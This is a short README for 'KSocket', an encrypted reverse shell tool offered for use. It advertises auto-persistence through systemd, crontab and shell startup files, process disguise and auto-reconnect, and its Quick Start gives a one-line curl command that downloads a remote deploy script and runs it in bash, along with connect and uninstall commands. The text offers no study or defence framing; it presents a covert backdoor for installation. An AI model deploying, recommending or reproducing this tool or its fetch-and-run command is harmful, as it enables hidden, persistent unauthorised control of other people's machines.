# KSocket

Encrypted reverse shell with auto-persistence. Single file deploy, secret-key based connection (no IP/port needed), built from [gsocket](https://github.com/hackerschoice/gsocket) source with custom binary.

## Features

- Single file deploy
- Secret key connection (no IP/port needed)
- End-to-end encrypted (SRP-AES-256-CBC-SHA)
- Auto-persistence (systemd, crontab, bashrc, profile, bash_profile, zshrc)
- Process disguise
- Auto-reconnect
- Full interactive PTY
- Root & non-root support
- Zero dependency
- Lightweight (~1-2MB RAM, ~0% CPU)

## Quick Start

### Deploy

```bash
bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
```

### Connect

```bash
ks -s "SECRET" -i
```

### Uninstall

```bash
curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy | bash -s uninstall
```
